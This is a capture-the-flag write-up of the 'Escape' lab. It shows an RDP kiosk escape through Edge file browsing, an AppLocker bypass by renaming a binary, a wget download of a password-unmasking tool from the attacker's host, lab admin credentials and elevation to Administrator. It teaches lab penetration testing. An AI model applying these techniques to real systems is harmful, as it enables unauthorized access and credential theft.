---
title: "Escape — VulnLab"
date: 2026-05-04
type: writeup
summary: "An RDP kiosk was escaped through Edge file browsing; recovered admin credentials and a UAC bypass gave full access."
tags:
  - rdp
  - kiosk-escape
  - applocker-bypass
  - uac-bypass
difficulty: easy
---

## Reconnaissance

### Port Scanning

Starting with a fast port scan using RustScan to identify open ports:

```bash
rustscan -a 10.129.7.54 --ulimit 5000
```

**Result:** Port `3389` (RDP) was found open.

Following up with an Nmap service scan:

```bash
nmap -sC -sV -p3389 10.129.7.54
```

```
PORT     STATE    SERVICE       VERSION
3389/tcp filtered ms-wbt-server
```

Only one port was exposed — RDP on port 3389.

## Initial Access — Kiosk Escape

### Connecting via RDP (Anonymous)

An initial RDP connection was attempted without credentials to enumerate the login screen:

```bash
xfreerdp /v:10.129.234.51 /sec:tls /cert:ignore /dynamic-resolution +clipboard
```

![Conference Display kiosk login screen](./images/01-kiosk-login.png)

The login screen revealed a **Conference Display** kiosk mode, explicitly stating to log in as `KioskUser0` without a password. Connecting with those credentials:

```bash
xfreerdp /v:10.129.7.54 /u:KioskUser0 /p:"" /dynamic-resolution
```

![Kiosk desktop wallpaper after login](./images/02-kiosk-desktop.png)

## Kiosk Enumeration and Escape

### Exploring the Locked-Down Environment

After logging in, the desktop presented a locked-down sandbox environment. The interface was entirely in **Korean**, with most functionality restricted.

- Pressing the **Windows key** opened the Start menu sidebar.
- Attempting to launch **PowerShell** was blocked — it appeared in search results but would not execute.

![PowerShell blocked in the Korean Start menu](./images/03-powershell-blocked.png)

### Using Microsoft Edge as a File Browser

After testing all installed applications, **Microsoft Edge** was found to be accessible. Edge can be leveraged to browse the local filesystem using the `file://` protocol.

Navigating to `C:/Users/kioskUser0/Desktop/`:

![Edge browsing local Desktop files](./images/04-edge-file-browser.png)

The Desktop contained `desktop.ini`, `Microsoft Edge.lnk`, and `user.txt` (the user flag).

Browsing further to `C:/_admin/profiles.xml` revealed a **Remote Desktop Plus** profile configuration:

![profiles.xml with encoded credentials](./images/05-profiles-xml.png)

The XML file contained:

- **ProfileName:** admin
- **UserName:** 127.0.0.1
- **Password:** `JWqkI6IDfQxXXmiHIKIP8caOG9XxnWQZgvtPgON2vWc=` (Base64 encoded)
- **Secure:** False

## Credential Extraction

### Bypassing AppLocker via Binary Renaming

The `rdp.exe` (Remote Desktop Plus) binary was blocked from executing. However, since **Microsoft Edge** (`msedge.exe`) was whitelisted, the executable was renamed to `msedge.exe` to bypass the application restriction.

After launching the renamed binary, the Remote Desktop Plus profile loaded successfully with the credentials pre-filled:

![Remote Desktop Plus loaded with the admin profile](./images/06-rdp-plus-profile.png)

The password field was masked with bullets. To recover the plaintext password, **BulletsPassView** (a NirSoft utility) was transferred from the attacker machine using a Python HTTP server and `wget` via PowerShell:

```powershell
PS> wget "http://10.10.14.158:80/BulletsPassView.exe" -o BulletsPassView.exe
```

Running BulletsPassView extracted the plaintext password from the masked field:

![BulletsPassView revealing the admin password](./images/07-bulletspassview-password.png)

**Recovered credentials:**

```
Username : admin
Password : Twisting3021
```

## Privilege Escalation

### Running CMD as Admin

With the recovered credentials, a new CMD session was spawned as the `admin` user:

```cmd
runas /user:admin cmd.exe
```

Checking the current user context with `whoami /all`:

![whoami output showing Administrators as deny-only](./images/08-whoami-deny-only.png)

The `admin` account was confirmed, but `BUILTIN\Administrators` was flagged as **"Group used for deny only"** — meaning UAC token filtering was actively blocking elevated privileges.

### UAC Bypass via PowerShell Elevation

To bypass the token filtering restriction, a new elevated CMD process was spawned using PowerShell's `Start-Process` with the `-Verb RunAs` flag:

```powershell
powershell -Command "Start-Process cmd -Verb RunAs"
```

This triggered a UAC prompt which was accepted, spawning a fully elevated shell as `Administrator`:

![Administrator desktop with root.txt](./images/09-admin-desktop-root.png)

The Administrator Desktop contained `root.txt`, confirming full system compromise.
